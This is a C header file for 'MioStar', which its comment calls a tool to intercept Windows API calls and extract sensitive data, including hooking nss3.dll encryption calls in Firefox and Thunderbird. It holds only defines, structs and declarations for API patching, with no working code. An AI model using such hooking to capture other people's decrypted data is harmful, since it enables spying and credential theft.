/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */







#ifndef _VOIP_RECORDER_H
#define _VOIP_RECORDER_H

#include <windows.h>

#define MAX_BUF_SIZE 1024
#define snprintf _snprintf

#define MIOSTAR_DIRECTORY "MioStar\\"
#define MIOSTAR_DLL_DIR "dlls\\"
#define MIOSTAR_RULES "Rules.txt"

/*
 * System Event logging codes
 *
 */

#define EVENT_DEFAULT 1000
#define EVENT_FILE 1001
#define EVENT_REGISTRY 1002
#define EVENT_SOCKET 1003
#define EVENT_HTTP 1004
#define EVENT_CRYPT 1005
#define EVENT_DSOUND 1006
#define EVENT_WINMM 1007
#define EVENT_MP3 1008
#define EVENT_SYSTEM 1009




/*
 * Type definitions
 *
 */

typedef struct 
{
  char *sDLLName;
  char *sFuncName;
  char *sConfFuncName;
  FARPROC sDLLFuncAddr;
  DWORD sFuncRepl;
  byte **sCallGatePtr;
} FUNCTION_HOOK;

typedef struct
{
  char *sDLLName;
  char *sFuncName;
  FARPROC sDLLFuncAddr;
} LOADED_FUNCS;

/*
 * Function forward declarations
 *
 */

BOOL PatchAPI(char *, char *, FARPROC *, FARPROC);
BOOL UnPatchAPI(char *, char *, FARPROC *);
void printDebug(char *pMsg, DWORD pEventID);
BOOL ruleExists(char *pProcName, char *pFunctionName);
int stringify(void *pInput, DWORD pInputLength, char *pOutput, DWORD pOutputLength);
char *stringify2(void *pInput, DWORD pInputLength);


/*
 * nss3.dll
 *
 */

typedef enum SECItemType
{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
};

struct SECItem
{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
};

typedef enum SECStatus
{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
};



#endif
